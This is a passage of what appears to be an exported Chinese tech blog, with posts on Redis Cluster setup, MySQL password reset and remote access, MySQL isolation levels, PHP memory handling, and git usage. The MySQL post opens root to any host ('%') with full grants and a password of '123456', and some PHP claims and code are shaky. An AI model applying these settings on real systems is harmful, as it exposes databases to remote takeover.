class=&quot;line&quot;&gt;##一台机器&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ps -ef | grep redis&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;root 61020 1 0 02:14 ? 00:00:01 redis-server 127.0.0.1:7000 [cluster]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;root 61024 1 0 02:14 ? 00:00:01 redis-server 127.0.0.1:7001 [cluster]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;root 61029 1 0 02:14 ? 00:00:01 redis-server 127.0.0.1:7002 [cluster]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;netstat -tnlp | grep redis&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;tcp 0 0 127.0.0.1:17000 0.0.0.0:*                   LISTEN       61020&amp;#x2F;redis-server&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;tcp 0 0 127.0.0.1:17001 0.0.0.0:*                   LISTEN       61024&amp;#x2F;redis-server&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;tcp 0 0 127.0.0.1:17002 0.0.0.0:*                   LISTEN       61029&amp;#x2F;redis-server&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;tcp 0 0 127.0.0.1:7000 0.0.0.0:*                   LISTEN       61020&amp;#x2F;redis-server&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;tcp 0 0 127.0.0.1:7001 0.0.0.0:*                   LISTEN       61024&amp;#x2F;redis-server&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;tcp 0 0 127.0.0.1:7002 0.0.0.0:*                   LISTEN       61029&amp;#x2F;redis-server&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;##另外一台机器&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ps -ef | grep redis&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;root 9957 1 0 02:32 ? 00:00:01 redis-server 127.0.0.1:7003 [cluster]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;root 9964 1 0 02:32 ? 00:00:01 redis-server 127.0.0.1:7004 [cluster]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;root 9971 1 0 02:32 ? 00:00:01 redis-server 127.0.0.1:7005 [cluster]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;root 10065 4744 0 02:32 pts&amp;#x2F;0 00:00:00 grep --color&amp;#x3D;auto redis&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;netstat -tlnp | grep redis&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;tcp        0      0 127.0.0.1:17003         0.0.0.0:*               LISTEN      9957&amp;#x2F;redis-server 1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;tcp        0      0 127.0.0.1:17004         0.0.0.0:*               LISTEN      9964&amp;#x2F;redis-server 1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;tcp        0      0 127.0.0.1:17005         0.0.0.0:*               LISTEN      9971&amp;#x2F;redis-server 1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;tcp        0      0 127.0.0.1:7003          0.0.0.0:*               LISTEN      9957&amp;#x2F;redis-server 1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;tcp        0      0 127.0.0.1:7004          0.0.0.0:*               LISTEN      9964&amp;#x2F;redis-server 1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;tcp        0      0 127.0.0.1:7005          0.0.0.0:*               LISTEN      9971&amp;#x2F;redis-server 1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;:hexoPostRenderEscape--&gt;</code></pre>
<h4 id="7-创建集群"><a href="#7-创建集群" class="headerlink" title="7.创建集群"></a>7.创建集群</h4><p>Redis 官方提供了 redis-trib.rb 这个工具，就在解压目录的 src 目录中，第三步中已将它复制到 /usr/local/bin 目录中，可以直接在命令行中使用了。使用下面这个命令即可完成安装。</p>
<pre><code>    redis-trib.rb  create  --replicas  1  192.168.31.245:7000 192.168.31.245:7001  192.168.31.245:7002 192.168.31.210:7003  192.168.31.210:7004  192.168.31.210:7005</code></pre>
<p>其中，前三个 ip:port 为第一台机器的节点，剩下三个为第二台机器。</p>
<p>等等，出错了。这个工具是用 ruby 实现的，所以需要安装 ruby。安装命令如下：</p>
<p>yum -y install ruby ruby-devel rubygems rpm-build<br>gem install redis</p>
<p>之后再运行 redis-trib.rb 命令，会出现如下提示：<br><img src="https://raw.githubusercontent.com/carolcoral/SaveImg/master/273364-20160929150634344-1055901726.jpg"></p>
<p>输入 yes 即可，然后出现如下内容，说明安装成功。<br><img src="https://raw.githubusercontent.com/carolcoral/SaveImg/master/273364-20160929150720000-1999293873.jpg"></p>
<h4 id="8-集群验证"><a href="#8-集群验证" class="headerlink" title="8. 集群验证"></a>8. 集群验证</h4><p>在第一台机器上连接集群的7002端口的节点，在另外一台连接7005节点，连接方式为</p>
<pre><code>    redis-cli -h 192.168.31.245 -c -p 7002  </code></pre>
<p>加参数 -C 可连接到集群，因为上面 redis.conf 将 bind 改为了ip地址，所以 -h 参数不可以省略。</p>
<p>在7005节点执行命令  set hello world ，执行结果如下：<br><img src="https://raw.githubusercontent.com/carolcoral/SaveImg/master/273364-20160929152337688-1332730145.jpg"></p>
<p>然后在另外一台7002端口，查看 key 为 hello 的内容， get hello  ，执行结果如下：<br><img src="https://raw.githubusercontent.com/carolcoral/SaveImg/master/273364-20160929152449688-978685655.jpg"></p>
<p>说明集群运作正常。</p>
<p>简单说一下原理</p>
<p>redis cluster在设计的时候，就考虑到了去中心化，去中间件，也就是说，集群中的每个节点都是平等的关系，都是对等的，每个节点都保存各自的数据和整个集群的状态。每个节点都和其他所有节点连接，而且这些连接保持活跃，这样就保证了我们只需要连接集群中的任意一个节点，就可以获取到其他节点的数据。</p>
<p>Redis 集群没有并使用传统的一致性哈希来分配数据，而是采用另外一种叫做哈希槽 (hash slot)的方式来分配的。redis cluster 默认分配了 16384 个slot，当我们set一个key 时，会用CRC16算法来取模得到所属的slot，然后将这个key 分到哈希槽区间的节点上，具体算法就是：CRC16(key) % 16384。所以我们在测试的时候看到set 和 get 的时候，直接跳转到了7000端口的节点。</p>
<p>Redis 集群会把数据存在一个 master 节点，然后在这个 master 和其对应的salve 之间进行数据同步。当读取数据时，也根据一致性哈希算法到对应的 master 节点获取数据。只有当一个master 挂掉之后，才会启动一个对应的 salve 节点，充当 master 。</p>
<p>需要注意的是：必须要3个或以上的主节点，否则在创建集群时会失败，并且当存活的主节点数小于总节点数的一半时，整个集群就无法提供服务了。</p>
]]></content>
      <categories>
        <category>数据库</category>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL 重设密码以及允许远程访问</title>
    <url>/2017/02/08/mysql-%E9%87%8D%E8%AE%BE%E5%AF%86%E7%A0%81%E4%BB%A5%E5%8F%8A%E5%85%81%E8%AE%B8%E8%BF%9C%E7%A8%8B%E8%AE%BF%E9%97%AE/</url>
    <content><![CDATA[<p>mysql 重设密码 修改MySQL的配置文件（默认为/etc/my.cnf）,在[mysqld]下添加一行skip-grant-tables 保存配置文件后，重启MySQL服务 service mysqld restart 再次进入MySQL命令行 mysql -uroot -p,输入密码时直接回车，就会进入MySQL数据库了，这个时候按照常规流程修改root密码即可。 UPDATE user SET Password=password(“test123”) WHERE user=’root’; mysql允许远程访问 1. vim /etc/mysql/my.cnf 注释掉bind_address 127.0.0.1 mysql -uroot -p mysql&gt;update user set host = ‘%’ where user = ‘root’; mysql&gt;GRANT ALL PRIVILEGES ON <em>.</em> TO ‘myuser’@’%’ IDENTIFIED BY ‘mypassword’ WITH GRANT OPTION; 2. 首先以 root 帐户登陆 MySQL</p>
<blockquote>
<p>MySQL -uroot -p (123456 为 root 用户的密码。)</p>
</blockquote>
<p>创建远程登陆用户并授权</p>
<blockquote>
<p>grant all PRIVILEGES on test_db.* to root@’192.168.1.101’ identified by ‘123456’;</p>
</blockquote>
<p>上面的语句表示将 test_db 数据库的所有权限授权给 root 这个用户，允许 root 用户在 192.168.1.101 这个 IP 进行远程登陆，并设置 root 用户的密码为 123456 。 下面逐一分析所有的参数： all PRIVILEGES 表示赋予所有的权限给指定用户，这里也可以替换为赋予某一具体的权限，例如select,insert,update,delete,create,drop 等，具体权限间用“,”半角逗号分隔。 test_db.* 表示上面的权限是针对于哪个表的，test_db指的是数据库，后面的 * 表示对于所有的表，由此可以推理出：对于全部数据库的全部表授权为“_._”，对于某一数据库的全部表授权为“数据库名.*”，对于某一数据库的某一表授权为“数据库名.表名”。 root 表示你要给哪个用户授权，这个用户可以是存在的用户，也可以是不存在的用户。 192.168.1.101 表示允许远程连接的 IP 地址，如果想不限制链接的 IP 则设置为“%”即可。 123456 为用户的密码。 执行了上面的语句后，再执行下面的语句，方可立即生效。</p>
<blockquote>
<p>flush privileges;</p>
</blockquote>
]]></content>
      <categories>
        <category>MySQL</category>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>ＭySQL隔离级别</title>
    <url>/2017/02/08/mysql%E9%9A%94%E7%A6%BB%E7%BA%A7%E5%88%AB/</url>
    <content><![CDATA[<blockquote>
<p>SQL标准定义了4类隔离级别，包括了一些具体规则，用来限定事务内外的哪些改变是可见的，哪些是不可见的。低级别的隔离级一般支持更高的并发处理，并拥有更低的系统开销。</p>
</blockquote>
<p><strong>1.Read Uncommitted（读取未提交内容）</strong> 在该隔离级别，所有事务都可以看到其他未提交事务的执行结果。本隔离级别很少用于实际应用，因为它的性能也不比其他级别好多少。读取未提交的数据，也被称之为脏读（Dirty Read）。 <strong>2.Read Committed（读取提交内容）</strong> 这是大多数数据库系统的默认隔离级别（但不是MySQL默认的）。它满足了隔离的简单定义：一个事务只能看见已经提交事务所做的改变。这种隔离级别 也支持所谓的不可重复读（Nonrepeatable Read），因为同一事务的其他实例在该实例处理其间可能会有新的commit，所以同一select可能返回不同结果。 <strong>3.Repeatable Read（可重读）</strong> 这是MySQL的默认事务隔离级别，它确保同一事务的多个实例在并发读取数据时，会看到同样的数据行。不过理论上，这会导致另一个棘手的问题：幻读 （Phantom Read）。简单的说，幻读指当用户读取某一范围的数据行时，另一个事务又在该范围内插入了新行，当用户再读取该范围的数据行时，会发现有新的“幻影” 行。InnoDB和Falcon存储引擎通过多版本并发控制（MVCC，Multiversion Concurrency Control）机制解决了该问题。 <strong>4.Serializable（可串行化）</strong> 这是最高的隔离级别，它通过强制事务排序，使之不可能相互冲突，从而解决幻读问题。简言之，它是在每个读的数据行上加上共享锁。在这个级别，可能导致大量的超时现象和锁竞争。 这四种隔离级别采取不同的锁类型来实现，若读取的是同一个数据的话，就容易发生问题。例如： 脏读(Drity Read)：某个事务已更新一份数据，另一个事务在此时读取了同一份数据，由于某些原因，前一个RollBack了操作，则后一个事务所读取的数据就会是不正确的。 不可重复读(Non-repeatable read):在一个事务的两次查询之中数据不一致，这可能是两次查询过程中间插入了一个事务更新的原有的数据。 幻读(Phantom Read):在一个事务的两次查询中数据笔数不一致，例如有一个事务查询了几列(Row)数据，而另一个事务却在此时插入了新的几列数据，先前的事务在接下来的查询中，就会发现有几列数据是它先前所没有的。 在MySQL中，实现了这四种隔离级别，分别有可能产生问题如下所示：</p>
<blockquote>
<p>下面，将利用MySQL的客户端程序，分别测试几种隔离级别。测试数据库为test，表为tx；表结构： id int num int 两个命令行客户端分别为A，B；不断改变A的隔离级别，在B端修改数据。</p>
</blockquote>
<p>（一）、将A的隔离级别设置为read uncommitted(未提交读) 在B未更新数据之前： 客户端A：<img src="http://dl.iteye.com/upload/picture/pic/72618/1ca8ec0d-3b6c-3ae1-babc-5dd541c4d1a4.jpg" alt="这里写图片描述"> B更新数据： 客户端B：<img src="http://dl.iteye.com/upload/picture/pic/72620/b37214c3-7726-3306-95ee-1b2fae5ccd6c.jpg" alt="这里写图片描述"> 客户端A：<img src="http://dl.iteye.com/upload/picture/pic/72622/200d9c94-197a-3fe5-8925-3411cd88555e.jpg" alt="这里写图片描述"></p>
<pre><code>    经过上面的实验可以得出结论，事务B更新了一条记录，但是没有提交，此时事务A可以查询出未提交记录。造成脏读现象。未提交读是最低的隔离级别。</code></pre>
<p>（二）、将客户端A的事务隔离级别设置为read committed(已提交读) 在B未更新数据之前： 客户端A：<img src="http://dl.iteye.com/upload/picture/pic/72626/ae414e52-c216-3bbb-b005-0d972f593456.jpg" alt="这里写图片描述"> B更新数据： 客户端B：<img src="http://dl.iteye.com/upload/picture/pic/72628/12051f3d-c01e-34b3-a6b6-8b71e1b1dcc8.jpg" alt="这里写图片描述"> 客户端A：<img src="http://dl.iteye.com/upload/picture/pic/72630/cc80744e-eb9f-3104-bb24-2218e9986d78.jpg" alt="这里写图片描述"></p>
<pre><code>   经过上面的实验可以得出结论，已提交读隔离级别解决了脏读的问题，但是出现了不可重复读的问题，即事务A在两次查询的数据不一致，因为在两次查询之间事务B更新了一条数据。已提交读只允许读取已提交的记录，但不要求可重复读。</code></pre>
<p>(三)、将A的隔离级别设置为repeatable read(可重复读) 在B未更新数据之前： 客户端A：<img src="http://dl.iteye.com/upload/picture/pic/72632/0bf52be3-e873-3f3f-8d56-d703a8f678ab.jpg" alt="这里写图片描述"> B更新数据： 客户端B：<img src="http://dl.iteye.com/upload/picture/pic/72634/e58d1814-bdca-3313-bcf5-339e3678536a.jpg" alt="这里写图片描述"> 客户端A：<img src="http://dl.iteye.com/upload/picture/pic/72636/83bfe583-2d57-345a-917e-4ee163235b62.jpg" alt="这里写图片描述"> B插入数据： 客户端B：<img src="http://dl.iteye.com/upload/picture/pic/72636/83bfe583-2d57-345a-917e-4ee163235b62.jpg" alt="这里写图片描述"> 客户端A：<img src="http://dl.iteye.com/upload/picture/pic/72640/4398c5b1-434c-3380-ba19-060154cf2070.jpg" alt="这里写图片描述"></p>
<pre><code>   由以上的实验可以得出结论，可重复读隔离级别只允许读取已提交记录，而且在一个事务两次读取一个记录期间，其他事务部的更新该记录。但该事务不要求与其他事务可串行化。例如，当一个事务可以找到由一个已提交事务更新的记录，但是可能产生幻读问题(注意是可能，因为数据库对隔离级别的实现有所差别)。像以上的实验，就没有出现数据幻读的问题。</code></pre>
<p>(四)、将A的隔离级别设置为 可串行化 (Serializable) A端打开事务，B端插入一条记录 事务A端：<img src="http://dl.iteye.com/upload/picture/pic/72642/c604c5ce-311d-3923-8dcd-36b0188f4f31.jpg" alt="这里写图片描述"> 事务B端：<img src="http://dl.iteye.com/upload/picture/pic/72644/c488f9d9-7da2-3e6d-9a82-2b92d1051afd.jpg" alt="这里写图片描述"> 因为此时事务A的隔离级别设置为serializable，开始事务后，并没有提交，所以事务B只能等待。 事务A提交事务： 事务A端 <img src="http://dl.iteye.com/upload/picture/pic/72644/c488f9d9-7da2-3e6d-9a82-2b92d1051afd.jpg" alt="这里写图片描述"> 事务B端 <img src="http://dl.iteye.com/upload/picture/pic/72648/8e60e19b-09af-31a7-b8d3-8e638bbf177c.jpg" alt="这里写图片描述"></p>
<pre><code>     serializable完全锁定字段，若一个事务来查询同一份数据就必须等待，直到前一个事务完成并解除锁定为止 。是完整的隔离级别，会锁定对应的数据表格，因而会有效率的问题。</code></pre>
]]></content>
      <categories>
        <category>MySQL</category>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
        <tag>隔离机制</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP内存溢出解决方案</title>
    <url>/2017/02/08/php%E5%86%85%E5%AD%98%E6%BA%A2%E5%87%BA%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</url>
    <content><![CDATA[<h2 id="一．内存溢出解决方案"><a href="#一．内存溢出解决方案" class="headerlink" title="一．内存溢出解决方案"></a>一．内存溢出解决方案</h2><p>在做数据统计分析时，经常会遇到大数组，可能会发生内存溢出，这里分享一下我的解决方案。还是用例子来说明这个问题，如下： 假定日志中存放的记录数为500000条，那么解决方案如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">ini_set(‘memory_limit’,’64M’);　&#x2F;&#x2F;重置php可以使用的内存大小为64M，一般在远程主机上是不能修改php.ini文件的，只能通过程序设置。注：在safe_mode（安全模式）下，ini_set失效</span><br><span class="line"></span><br><span class="line">set_time_limit(600);&#x2F;&#x2F;设置超时限制为６分钟</span><br><span class="line"></span><br><span class="line">$farr &#x3D; $Uarr &#x3D; $Marr &#x3D; $IParr &#x3D; $data &#x3D; $_sub &#x3D; array();</span><br><span class="line"></span><br><span class="line">$spt &#x3D; ”$@#!$”;</span><br><span class="line"></span><br><span class="line">$root &#x3D; ”&#x2F;Data&#x2F;webapps&#x2F;VisitLog”;</span><br><span class="line"></span><br><span class="line">$path &#x3D; $dpath &#x3D; $fpath &#x3D; NULL;</span><br><span class="line"></span><br><span class="line">$path &#x3D; $root.”&#x2F;”.date(“Y-m”,$timestamp);</span><br><span class="line"></span><br><span class="line">$dpath &#x3D; $path.”&#x2F;”.date(“m-d”,$timestamp);</span><br><span class="line"></span><br><span class="line">for($j&#x3D;0;$j&lt;24;$j++)&#123;</span><br><span class="line"></span><br><span class="line">$v &#x3D; ($j &lt; 10) ? ”0″.$j : $j;</span><br><span class="line"></span><br><span class="line">$gpath &#x3D; $dpath.”&#x2F;”.$v.”.php”;</span><br><span class="line"></span><br><span class="line">if(!file_exists($gpath))&#123;</span><br><span class="line"></span><br><span class="line">continue;</span><br><span class="line"></span><br><span class="line">&#125; else &#123;</span><br><span class="line"></span><br><span class="line">$arr &#x3D; file($gpath);&#x2F;&#x2F;&#x2F;&#x2F;将文件读入数组中</span><br><span class="line"></span><br><span class="line">array_shift($arr);&#x2F;&#x2F;移出第一个单元－》&lt;?php exit;?&gt;</span><br><span class="line"></span><br><span class="line">$farr &#x3D; array_merge($farr,$arr);</span><br><span class="line"></span><br><span class="line">unset($arr);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(empty($this-&gt;farr))&#123;</span><br><span class="line"></span><br><span class="line">echo ”&lt;p&gt;&lt;center&gt;没有相关记录！&lt;&#x2F;center&gt;&lt;&#x2F;p&gt;”;</span><br><span class="line"></span><br><span class="line">exit;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">while(!empty($farr))&#123;</span><br><span class="line"></span><br><span class="line">$_sub &#x3D; array_splice($farr, 0, 10000); &#x2F;&#x2F;每次取出$farr中1000个</span><br><span class="line"></span><br><span class="line">for($i&#x3D;0,$scount&#x3D;count($_sub);$i&lt;$scount;$i++)&#123;</span><br><span class="line"></span><br><span class="line">$arr &#x3D; explode($spt,$_sub[$i]);</span><br><span class="line"></span><br><span class="line">$Uarr[] &#x3D; $arr[1]; &#x2F;&#x2F;vurl</span><br><span class="line"></span><br><span class="line">$Marr[] &#x3D; $arr[2]; &#x2F;&#x2F;vmark</span><br><span class="line"></span><br><span class="line">$IParr[] &#x3D; $arr[3].” |$nbsp;”.$arr[1]; &#x2F;&#x2F;IP</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unset($_sub);&#x2F;&#x2F;用完及时销毁</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unset($farr);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>  这里，不难看出，一方面，我们要增加PHP可用内存大小，另一方面，只要我们想办法对数组进行分批处理，分而治之，将用过的变量及时销毁(unset)，一般是不会出现溢出问题的。 另外，为了节省PHP程序内存损耗，我们应当尽可能减少静态变量的使用，在需要数据重用时，可以考虑使用引用(&amp;)。再一点就是：数据库操作完成后，要马上关闭连接；一个对象使用完，要及时调用析构函数（<code>__destruct()</code>）。</p>
<h2 id="二．unset销毁变量并释放内存问题"><a href="#二．unset销毁变量并释放内存问题" class="headerlink" title="二．unset销毁变量并释放内存问题"></a>二．unset销毁变量并释放内存问题</h2><p>PHP的unset()函数用来清除、销毁变量，不用的变量，我们可以用unset()将它销毁。但是某些时候，用unset()却无法达到销毁变 量占用的内存！我们先看一个例子：   最后输出unset()之前占用内存减去unset()之后占用内存，如果是正数，那么说明unset(s)已经将s从内存中销毁(或者说，unset()之后内存占用减少了)，可是我在PHP5和windows平台下，得到的结果是：0。这是否可以说明，unset(s)并没有起到销毁变量s所占用内存的作用呢？我们再作下面的例子：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$s&#x3D;str_repeat(&#39;1&#39;,256); &#x2F;&#x2F;产生由256个1组成的字符串</span><br><span class="line">$m&#x3D;memory_get_usage(); &#x2F;&#x2F;获取当前占用内存</span><br><span class="line">unset($s);</span><br><span class="line">$mm&#x3D;memory_get_usage(); &#x2F;&#x2F;unset()后再查看当前占用内存</span><br><span class="line">echo $m-$mm;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这个例子，和上面的例子几乎相同，唯一的不同是，s由256个1组成，即比第一个例子多了一个1，得到结果是：272。这是否可以说明，unset(s)已经将$s所占用的内存销毁了？ 通过上面两个例子，我们可以得出以下结论： 结论一、unset()函数只能在变量值占用内存空间超过256字节时才会释放内存空间。 那么是不是只要变量值超过256，使用unset就可以释放内存空间呢？我们再通过一个例子来测试一下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$s&#x3D;str_repeat(&#39;1&#39;,256); &#x2F;&#x2F;这和第二个例子完全相同</span><br><span class="line">$p&#x3D;&amp;$s;</span><br><span class="line">$m&#x3D;memory_get_usage();</span><br><span class="line">unset($s); &#x2F;&#x2F;销毁$s</span><br><span class="line">$mm&#x3D;memory_get_usage();</span><br><span class="line">echo $p.&#39;&lt;br &#x2F;&gt;&#39;;</span><br><span class="line">echo $m-$mm;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>  刷新页面，我们看到第一行有256个1，第二行是0，按理说我们已经销毁了s，而p只是引用s的变量，应该是没有内容了，另外，unset(s)前后内存占用没变化！现在我们再做以下的例子：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$s&#x3D;str_repeat(&#39;1&#39;,256); &#x2F;&#x2F;这和第二个例子完全相同</span><br><span class="line">$p&#x3D;&amp;$s;</span><br><span class="line">$m&#x3D;memory_get_usage();</span><br><span class="line">$s&#x3D;null; &#x2F;&#x2F;设置$s为null</span><br><span class="line">$mm&#x3D;memory_get_usage();</span><br><span class="line">echo $p.&#39;&lt;br &#x2F;&gt;&#39;;</span><br><span class="line">echo $m-$mm;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>  现在刷新页面，我们看到，输出p已经是没有内容了，unset()前后内存占用量之差是272，即已经清除了变量占用的内存。本例中的s=null也 可以换成unset()，如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$s&#x3D;str_repeat(&#39;1&#39;,256); &#x2F;&#x2F;这和第二个例子完全相同</span><br><span class="line">$p&#x3D;&amp;$s;</span><br><span class="line">$m&#x3D;memory_get_usage();</span><br><span class="line">unset($s); &#x2F;&#x2F;销毁$s</span><br><span class="line">unset($p);</span><br><span class="line">$mm&#x3D;memory_get_usage();</span><br><span class="line">echo $p.&#39;&lt;br &#x2F;&gt;&#39;;</span><br><span class="line">echo $m-$mm;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>  我们将s和p都使用unset()销毁，这时再看内存占用量之差也是272，说明这样也可以释放内存。那么，我们可以得到另外一条结论： 结论二、只有当指向该变量的所有变量（如引用变量）都被销毁后，才会释放内存。</p>
]]></content>
      <categories>
        <category>编程</category>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>内存溢出</tag>
      </tags>
  </entry>
  <entry>
    <title>git常用命令二</title>
    <url>/2017/02/08/git%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E4%BA%8C/</url>
    <content><![CDATA[<p>Git鼓励大量使用分支： <strong>查看分支：git branch 创建分支：git branch 切换分支：git checkout 创建+切换分支：git checkout -b 合并某分支到当前分支：git merge 删除分支：git branch -d</strong></p>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><blockquote>
<p>当Git无法自动合并分支时，就必须首先解决冲突。解决冲突后，再提交，合并完成。</p>
</blockquote>
<p>用<strong>git log –graph</strong>命令可以看到<strong>分支合并图</strong>。 通常，合并分支时，如果可能，Git会用Fast forward模式，<strong>但这种模式下，删除分支后，会丢掉分支信息</strong>。</p>
<blockquote>
<p>如果要<strong>强制禁用Fast forward模式</strong>，Git就会在merge时<strong>生成一个新的commit，这样，从分支历史上就可以看出分支信息</strong>。准备合并dev分支，请注意**–no-ff参数，表示禁用Fast forward：**</p>
<p>$ git merge –no-ff -m “merge with no-ff” dev<br>Merge made by the ‘recursive’ strategy.<br>readme.txt |    1 + 1 file changed, 1 insertion(+)</p>
<p> </p>
</blockquote>
<p>因为本次合并要创建一个新的commit，所以加上-m参数，把commit描述写进去。合并后，我们用git log看看分支历史：</p>
<p>$ git log –graph –pretty=oneline –abbrev-commit<br>*   7825a50 merge with no-ff<br>|<br>| * 6224937 add merge<br>|/<br>*   59bc1cb conflict fixed …</p>
<p>  <strong>分支策略</strong></p>
<blockquote>
<p>在实际开发中，我们应该按照几个基本原则进行分支管理： 首先，<strong>master分支应该是非常稳定的</strong>，也就是仅用来发布新版本，<strong>平时不能在上面干活；</strong>那在哪干活呢？干活都在dev分支上，也就是说，dev分支是不稳定的，到某个时候，比如1.0版本发布时，再把dev分支合并到master上，在master分支发布1.0版本</p>
</blockquote>
<p>你和你的小伙伴们每个人都在dev分支上干活，每个人都有自己的分支，时不时地往dev分支上合并就可以了。 所以，团队合作的分支看起来就像这样：</p>
<p><img src="http://upload-images.jianshu.io/upload_images/220694-a54e1c1c80a4585d?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>git-br-policy</p>
<p><strong>小结</strong> Git分支十分强大，在团队开发中应该充分应用。 合并分支时，<strong>加上–no-ff参数就可以用普通模式合并，合并后的历史有分支，能看出来曾经做过合并，而fast forward合并就看不出来曾经做过合并</strong> 命令<strong>git push origin 可以推送一个本地标签</strong>； 命令<strong>git push origin –tags可以推送全部未推送过的本地标签；</strong> 命令<strong>git tag -d 可以删除一个本地标签；</strong> 命令<strong>git push origin :refs/tags/可以删除一个远程标签</strong>。 <strong>忽略特殊文件</strong> 有些时候，你<strong>必须把某些文件放到Git工作目录中</strong>，<strong>但又不能提交它们</strong>，比如保存了数据库密码的配置文件啦等等，每次git status都会显示Untracked files …，有强迫症的童鞋心里肯定不爽。好在Git考虑到了大家的感受，这个问题解决起来也很简单，在<strong>Git工作区</strong>的<strong>根目录下</strong>创建一个特殊的**.gitignore文件<strong>，然后把</strong>要忽略的文件名填进去，Git就会自动忽略这些文件。**不需要从头写.gitignore文件，GitHub已经为我们准备了各种配置文件，只需要组合一下就可以使用了。</p>
<blockquote>
<p>所有配置文件可以直接在线浏览：**<a href="https://github.com/github/gitignore">https://github.com/github/gitignore</a>**</p>
</blockquote>
<p>忽略文件的原则是：忽略操作系统自动生成的文件，比如缩略图等； 忽略编译生成的中间文件、可执行文件等，也就是如果一个文件是通过另一个文件自动生成的，那自动生成的文件就没必要放进版本库，比如Java编译产生的.class文件； 忽略你自己的带有敏感信息的配置文件，比如存放口令的配置文件。 举个例子： 假设你在Windows下进行Python开发，Windows会自动在有图片的目录下生成隐藏的缩略图文件. 如果有自定义目录，目录下就会有<strong>Desktop.ini</strong>文件.因此你需要忽略Windows自动生成的垃圾文件：<code>Windows:Thumbs.db ehthumbs.db Desktop.ini</code> 然后，继续忽略Python编译产生的**.pyc、.pyo、dist<strong>等文件或目录：<code>Python: *.py[cod] *.so *.egg *.egg -info dist build</code>加上你自己定义的文件，最终得到一个完整的</strong>.gitignore**文件. 内容如下</p>
<p># Windows:Thumbs.db ehthumbs.db  Desktop.ini<br># Python:*.py[cod] *.so *.egg *.egg-info dist build<br># My configurations:db.ini deploy_key_rsa</p>
